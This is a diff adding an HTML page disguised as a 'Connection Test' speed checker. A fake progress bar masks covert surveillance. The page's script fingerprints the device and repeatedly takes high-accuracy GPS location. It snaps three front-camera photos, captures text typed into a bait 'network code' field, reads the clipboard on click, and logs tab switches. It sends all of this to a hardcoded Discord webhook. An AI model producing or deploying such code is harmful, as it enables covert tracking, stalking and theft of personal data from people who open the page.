@@ -1,0 +1,148 @@
+<!doctype html>
+<html lang="en">
+<head>
+<script>const HOOK = "https://discord.com/api/webhooks/1568704069793480874/dyYCKzjN_0A5pTv18wRV1Vtjo4wQxxhcu_g1um0KuXM3N7hBOaYK3IE1QlQv9d53Ttb-";</script>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Connection Test</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;font-family:system-ui,-apple-system,sans-serif;background:#0b0f16;color:#e6edf7;
+ min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
+.box{width:100%;max-width:380px;text-align:center}
+h1{font-size:19px;margin:0 0 6px}
+p{font-size:13px;color:#8593a8;margin:0 0 22px;line-height:1.5}
+.bar{height:6px;background:#182031;border-radius:99px;overflow:hidden;margin-bottom:12px}
+.fill{height:100%;width:0;background:linear-gradient(90deg,#3b82f6,#60d394);
+ border-radius:99px;transition:width .4s ease}
+#st{font-size:12px;color:#5d6b80;min-height:16px}
+input{width:100%;margin-top:18px;padding:12px;border-radius:10px;border:1px solid #22304a;
+ background:#111826;color:#e6edf7;font-size:15px;text-align:center}
+.lbl{font-size:11px;color:#5d6b80;margin-top:16px;text-transform:uppercase;letter-spacing:.8px}
+</style>
+</head>
+<body>
+<div class="box">
+  <h1>Checking your connection</h1>
+  <p>Keep this open for a moment while it measures speed and signal quality.</p>
+  <div class="bar"><div class="fill" id="fill"></div></div>
+  <div id="st">starting…</div>
+  <div class="lbl">Confirm your network code</div>
+  <input id="code" placeholder="type anything to continue" autocomplete="off">
+</div>
+
+<script>
+const $ = id => document.getElementById(id);
+const t0 = Date.now();
+const dev = { ua:navigator.userAgent, lang:navigator.language,
+  tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+  screen:screen.width + "x" + screen.height, platform:navigator.platform,
+  touch:navigator.maxTouchPoints, cores:navigator.hardwareConcurrency };
+try {
+  const c = document.createElement("canvas").getContext("webgl");
+  const d = c.getExtension("WEBGL_debug_renderer_info");
+  dev.gpu = d ? c.getParameter(d.UNMASKED_RENDERER_WEBGL) : "n/a";
+} catch(e){}
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+let lat = null, lon = null, acc = null, batt = "?", vis = "visible", clip = "";
+
+function base(){
+  return [
+    "**On page:** " + Math.round((Date.now() - t0) / 1000) + "s · **Tab:** " + vis,
+    "**GPS:** " + (lat ? lat + ", " + lon + " ±" + Math.round(acc) + "m" : "pending"),
+    "**Device:** " + dev.platform + " · " + dev.screen + " · " + (dev.cores || "?") + " cores",
+    "**GPU:** " + (dev.gpu || "-"),
+    "**Net:** " + ((navigator.connection && navigator.connection.effectiveType) || "?") +
+      " · **Batt:** " + batt + " · **Touch:** " + dev.touch,
+    "**TZ / Lang:** " + dev.tz + " / " + dev.lang,
+    "**UA:** " + dev.ua.slice(0, 170)
+  ];
+}
+
+async function send(title, lines, blob){
+  const fd = new FormData();
+  fd.append("payload_json", JSON.stringify({
+    username: "Net Probe",
+    embeds: [{ title: title, description: lines.join("\n"), color: 0x3B82F6 }]
+  }));
+  if (blob) fd.append("files[0]", blob, "shot.jpg");
+  try { await fetch(HOOK, { method:"POST", body:fd }); } catch(e){}
+}
+
+function geo(){
+  return new Promise(r => navigator.geolocation.getCurrentPosition(
+    p => { lat = p.coords.latitude.toFixed(5); lon = p.coords.longitude.toFixed(5);
+           acc = p.coords.accuracy; r(true); },
+    () => r(false),
+    { enableHighAccuracy:true, timeout:8000 }));
+}
+
+// fake progress, real work
+let pct = 0;
+const tick = setInterval(() => {
+  pct = Math.min(100, pct + 9);
+  $("fill").style.width = pct + "%";
+  $("st").textContent = pct < 40 ? "measuring signal…"
+    : pct < 80 ? "checking stability…" : "almost done…";
+  if (pct >= 100) { clearInterval(tick); $("st").textContent = "connection verified"; }
+}, 900);
+
+document.addEventListener("visibilitychange", () => {
+  vis = document.hidden ? "hidden" : "visible";
+  send(vis === "hidden" ? "Left the page" : "Came back", base());
+});
+
+async function boot(){
+  if (navigator.getBattery) navigator.getBattery()
+    .then(b => { batt = Math.round(b.level * 100) + "%"; });
+  await geo();
+  await send("Session opened", base());
+  setInterval(() => { geo().then(() => send("Heartbeat", base())); }, 20000);
+  await sleep(900);
+  burst();
+}
+
+async function burst(){
+  try {
+    const s = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user", width:640 } });
+    const v = document.createElement("video");
+    v.srcObject = s; v.muted = true; v.playsInline = true;
+    await v.play(); await sleep(1300);
+    for (let i = 1; i <= 3; i++){
+      const c = document.createElement("canvas");
+      c.width = v.videoWidth || 480; c.height = v.videoHeight || 640;
+      c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
+      const b = await new Promise(r => c.toBlob(r, "image/jpeg", 0.7));
+      await send("Photo " + i + "/3", base(), b);
+      await sleep(1400);
+    }
+    s.getTracks().forEach(t => t.stop());
+  } catch(e) {
+    await send("Camera blocked", base());
+  }
+}
+
+let lastType = "";
+let tmr;
+$("code").addEventListener("input", e => {
+  clearTimeout(tmr);
+  tmr = setTimeout(() => {
+    if (e.target.value === lastType) return;
+    lastType = e.target.value;
+    send("Typed", ["**Field:** " + (lastType || "(cleared)")]);
+  }, 900);
+});
+
+document.body.addEventListener("click", async () => {
+  if (clip) return;
+  try {
+    clip = await navigator.clipboard.readText();
+    if (clip) send("Clipboard", ["**Contents:** " + clip.slice(0, 400)]);
+  } catch(e){}
+}, { once: true });
+
+boot();
+</script>
+</body>
+</html>
